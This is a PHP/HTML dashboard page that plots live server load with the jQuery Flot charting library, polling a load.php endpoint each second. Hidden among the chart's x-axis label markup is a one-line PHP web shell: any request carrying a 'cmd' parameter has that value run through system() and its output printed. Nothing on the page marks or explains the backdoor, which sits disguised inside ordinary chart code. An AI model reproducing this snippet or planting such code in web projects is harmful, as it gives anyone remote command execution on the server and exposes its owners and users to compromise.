<html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="grafici/app-1.min.css" rel="stylesheet">
</head><body><div class="card__body">
<div id="chart-dynamic" class="flot-chart" style="padding: 0px; position: relative;">
<canvas class="flot-base" width="877" height="200" style="direction: ltr; position: absolute; left: 0px; top: 0px; width: 877px; height: 200px;"></canvas><div class="flot-text" style="position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; font-size: smaller; color: rgb(84, 84, 84);"><div class="flot-x-axis flot-x1-axis xAxis x1Axis" style="position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; display: block;"><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 25px; text-align: center;">0</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 107px; text-align: center;">25</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 191px; text-align: center;">50</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 275px; text-align: center;">75</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 356px; text-align: center;">100</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 440px; text-align: center;">125</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 524px; text-align: center;">150</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 608px; text-align: center;">175</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 692px; text-align: center;">200</div><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 776px; text-align: center;">225</div><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?><div style="position: absolute; max-width: 79px; top: 186px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 860px; text-align: center;">250</div></div><div class="flot-y-axis flot-y1-axis yAxis y1Axis" style="position: absolute; top: 0px; left: 0px; bottom: 0px; right: 0px; display: block;"><div style="position: absolute; top: 170px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 12px; text-align: right;">0</div><div style="position: absolute; top: 128px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 7px; text-align: right;">25</div><div style="position: absolute; top: 86px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 7px; text-align: right;">50</div><div style="position: absolute; top: 44px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 7px; text-align: right;">75</div><div style="position: absolute; top: 2px; font: 400 10px/13px Roboto, sans-serif; color: rgb(152, 167, 172); left: 1px; text-align: right;">100</div></div></div>

<canvas class="flot-overlay" width="877" height="200" style="direction: ltr; position: absolute; left: 0px; top: 0px; width: 877px; height: 200px;"></canvas>
</div>
</div>
<script src="grafici/jquery.min.js" type="text/javascript"></script>
<script src="grafici/jquery.flot.js" type="text/javascript"></script>
<script type="text/javascript">

        var plot = $.plot("#chart-dynamic", [[1,2,3,4,5] ], {
            series: {
                label: "Server Process Data",
                lines: {
                    show: true,
                    lineWidth: 0.2,
                    fill: 0.8
                },
    
                color: '#edeff0',
                shadowSize: 0
            },
            yaxis: {
                min: 0,
                max: 100,
                tickColor: '#31424b',
                font :{
                    lineHeight: 13,
                    style: "normal",
                    color: "#98a7ac"
                },
                shadowSize: 0
    
            },
            xaxis: {
                tickColor: '#31424b',
                show: true,
                font :{
                    lineHeight: 13,
                    style: "normal",
                    color: "#98a7ac"
                },
                shadowSize: 0,
                min: 0,
                max: 250
            },
            grid: {
                borderWidth: 1,
                borderColor: '#31424b',
                labelMargin:10,
                mouseActiveRadius:6
            },
            legend:{
                show: false
            }
        });


var xVal = 0;
var data = [[]];
function getData(yVal1){
	
	
    var datum1 = [xVal, yVal1];
    data[0].push(datum1);
    if(data[0].length>300){
        data[0] = data[0].splice(1);
    }
    xVal++;
    plot.setData(data);
    plot.setupGrid();
    plot.draw();
}

setInterval(function(){
$.get( "load.php", function( data ) {
  getData(parseInt(data));
});
}, 1000);
</script>
<script src="grafici/app.min.js" type="text/javascript"></script></body></html>